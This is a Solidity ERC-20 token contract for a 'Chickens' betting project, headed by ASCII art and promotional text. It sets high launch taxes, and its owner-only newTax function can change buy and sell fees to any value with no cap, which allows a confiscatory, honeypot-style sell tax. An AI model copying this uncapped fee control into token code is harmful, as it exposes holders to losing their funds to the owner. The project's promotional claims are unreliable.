/*
                   .-============:  .+@@@@@@@@@@@@@@@@@@@%.  =========:                   
                 :=============-  .*@@@@@@@##**++**#%@@@@@@. .==========-.                
              .-==============:  +@@@@@%*+=+***#######%@@@@#  ..::-========:              
            .-===============. .%@@@@#+=+*########%#####@@@@====:.   :=======:            
           -================  :@@@@%+=+*########%%%#####@@@@@@@@@@%+:  -=======.          
         :=================. .@@@@*==*########%%%%#####@@@@%%%%%@@@@@*  :=======-         
        -=================-  %@@@*=+#######%%%%%#####%@@@%%######%@@@@#  -========.       
       ===================. -@@@#=+######%%%%####%%%@@%%%%%###%###@@@@@: .=========:      
     .====================  *@@@=+####%%%%%%%%%%%%%%%%%%%%#%%%####@@@@@. :==========-     
    .====================-  %@@#=###%%%%%%%%%%%%%%%%%%%%%%%####%%@@@@@+  :===========-    
    =====================-  %@@**##%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@@@@@@*. .===========-   
   -===================:    %@@*##%%%%%%%%@@@@@@@@@@@@@%%%%%%%%%%##%@@@@%  :===========.  
  .=================-.  :+%@@@@*#%%%%%@@@@@@@@@@@@@@@@@@@@%%#########%@@@+  ============  
  =================. .=%@@@*+@@%%%%%@@@@%+=:.      .:-+#@@@@@%%%%%%###@@@@  -===========: 
 :===============-  =@@@@+  .#@@%%@@@#-       -+++=.     -#@@@@%%####@@@@#  -============ 
 -==============-  *@@@@%#. .-@@@@@%:       +%%%%@@@#:     :#@@@@%@@@@@@@: .=============.
 ===============  +@@+.      :=@@@+                :*@.      =@@@@@@@@@#. .==============:
:==============. .@@+...      .+@=      :=****+-     :-       -@@@#*+=.  :===============-
:==============  +@@@@%#@#-     -     =%@+-::-+@@+             =@@*   :-==================
-==============  #@@+  .+#@+.        #@#   :==- +@%:            %@@.  ====================
:=============-  %@#    %@@@-.      +@@    -%@@@:*@#.           +@@-  ===================-
 =============: .@@+ :@%@@@@*:      @@*  - :%@@@@:@@:.          +@@.  ===================:
 =============:  @@+. @@@@@@%+-. . :@@+  @@@@@@@@:@@-:          +@#   ===================.
 :============-  %@%%@@@@@@%@@@@@#+-@@#. #@@@@@@@.@@::...       %@@#-  :================= 
  ============. .#@@@#+========+*#%@@@@-.:@@@@@@@%@@@%#+::.    -@#@@@#. .===============- 
  :==========  :@@@#.-+============+#@@@--+@@@@@#=-..:-+%=:   .*-:=#@@@=  -=============  
   =========: .@@@+ ==================*@@@@###%@@*.     .*.   ::..::-%@@*  :===========.  
   .========  =@@@ .+===================##+====+%@@-               .::%@@#  :=========-   
    .======-  *@@@ .====*#%%%##*++++=====++*#*+==%@%.                .:%@@#  :=======-    
     .=====  +@@@@- ==*%@@@@@@@@@%##*+++==+*%%*==#@%:                 .:%@@*  -=====-     
      .===:  @@@@@@-:*@@%---@#@%@@@@@@%%%%@#+===*@@-:                  .-@@@-  ====-      
        -=: :@@@.#@@##@@--@#@#%%%%@%%**++++**#%@%*::                    .#@@@  :==:       
         ::  @@@.::=*##%*:@%#%%%%#*++==*%%*+==-:..           .           -@@@=  -         
             +@@# .:*.::::%@*+++++===*@@@=::.                 .:         .@@@%            
              =@@@*=@#=--#@@@%#****#@@%@@%                     -:.        %@@@            
                %@@%*%@@@%*#%@@@@@@%%%%%@@%                    -=:.       %@@@:           
               %@@* ::@@%=###%%@@+#####%%@@%.         .         @-::      %@@@:           
              #@@= .:*@@*=####%@@=*#####%%@@@-        :.        #%::.    .@@@@.           
             +@@+  =.+@@@*+##%%@@#=*#####%%@@@.        :.       #@+::    *@@@@            
            :@@% .++  +@@@@@@@@@@@@#***##%@@@%:        -:.      #@%..   *@@@@=            
            *@@+:=@:   .+#%%%*+.-*@@@@@@@@@%+:.        #::      @@@%*+*@@@@@#             
            #@@%=@@.    :::::.  :::-=++++=::::        .@::     -@@@@@@@@@@@=              
            +@@@@@@.   .::::    ::::    .::.:         +@::    .@@@%.-=+++-                
             -#%@@@= .::.=@.   .:::.     :. =%       .@@+.   =@@@@-                       
                .@@@+-=*@@@:  .::-%-    .. -@@@=    -@@@@@@@@@@@@+                        

Chickens.GG offers you the opportunity to participate in betting on which chicken breed produces more eggs each day using a smart contract on the Ethereum chain.

The Chickens project advocates against the misuse of capital in the crypto space, advocating for greater emphasis on consumer apps that share revenue with token holders, rather than relying solely on overvalued VC-backed infrastructure.
We take pride in being a legitimate and practical project, exemplifying a real use case.
CHICKEN Holders have grown weary of overpriced and underutilized crypto protocols. 
As a response, we aim to deliver a powerful message!

Website: https://chickens.gg
Twitter: https://twitter.com/chickensgg_eth
Telegram: https://t.me/chickensgg
Medium: https://medium.com/@chickensgg

*/

// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, " multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "new owner is the zero address");
        _owner = newOwner;
        emit OwnershipTransferred(_owner, newOwner);
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

contract Chickens is Context, IERC20, Ownable {
    // CHICKENS.GG
    // There are two chickens for each breed, totaling eight chickens. 
	// The total count of eggs for each chicken breed is calculated at the end of the day, and the sum of eggs counts for each breed determines the outcome.
	// Wins are paid from the house money, and the betting house's profits are shared with token holders as a token tax fee. 
	// Notably, you, as a viewer watching the livestream on YouTube, have the unique opportunity to influence the outcome. 
	
    using SafeMath for uint256;
    mapping(address => uint256) private _balance;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFeeWallet;
    uint8 private constant _decimals = 18;
    uint256 private constant _totalSupply = 1000000 * 10**_decimals;
    
    uint256 private constant onePercent = 4000 * 10**_decimals;

    uint256 public maxWalletAmount = _totalSupply / 100 * 2;

    uint256 private _tax;
    uint256 public buyTax = 25;
    uint256 public sellTax = 40;
	//Tax will be changed to 5%/5% - 3 minutes after start to prevent snipes

    string private constant _name = "Chickens";
    string private constant _symbol = "CHICKENS";

    IUniswapV2Router02 private uniswapV2Router;
    address public uniswapV2Pair;
    address payable public taxWallet;
        
    uint256 private launchedAt;
    uint256 private launchDelay = 0;
    bool private launch = false;

    uint256 private constant minSwap = onePercent / 20;
    bool private inSwapAndLiquify;
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor() {
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
		
        taxWallet = payable(0xb66aFE5174DF6Bf7943f8548CD89DdDfb1C3BAd9);
        _isExcludedFromFeeWallet[msg.sender] = true;
        _isExcludedFromFeeWallet[taxWallet] = true;
        _isExcludedFromFeeWallet[address(this)] = true;

        _allowances[owner()][address(uniswapV2Router)] = _totalSupply;
        _balance[owner()] = _totalSupply;
        emit Transfer(address(0), address(owner()), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function transfer(address recipient, uint256 amount)public override returns (bool){
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256){
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool){
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender,_msgSender(),_allowances[sender][_msgSender()].sub(amount,"low allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0) && spender != address(0), "approve zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function enableTrading() external onlyOwner {
        launch = true;
        launchedAt = block.number;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "transfer zero address");

        if (_isExcludedFromFeeWallet[from] || _isExcludedFromFeeWallet[to]) {
            _tax = 0;
        } else {
            require(launch, "Wait till launch");
            if (block.number < launchedAt + launchDelay) {_tax=40;} else {
                if (from == uniswapV2Pair) {
                    require(balanceOf(to) + amount <= maxWalletAmount, "Max wallet 2% at launch");
                    _tax = buyTax;
                } else if (to == uniswapV2Pair) {
                    uint256 tokensToSwap = balanceOf(address(this));
                    if (tokensToSwap > minSwap && !inSwapAndLiquify) {
                        if (tokensToSwap > onePercent) {
                            tokensToSwap = onePercent;
                        }
                        swapTokensForEth(tokensToSwap);
                    }
                    _tax = sellTax;
                } else {
                    _tax = 0;
                }
            }
        }
        uint256 taxTokens = (amount * _tax) / 100;
        uint256 transferAmount = amount - taxTokens;

        _balance[from] = _balance[from] - amount;
        _balance[to] = _balance[to] + transferAmount;
        _balance[address(this)] = _balance[address(this)] + taxTokens;

        emit Transfer(from, to, transferAmount);
    }

    function removeAllLimits() external onlyOwner {
        maxWalletAmount = _totalSupply;
    }

    function newTax(uint256 newBuyTax, uint256 newSellTax) external onlyOwner {
        buyTax = newBuyTax;
        sellTax = newSellTax;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            taxWallet,
            block.timestamp
        );
    }

    function sendEthToTaxWallet() external {
        taxWallet.transfer(address(this).balance);
    }

    receive() external payable {}
}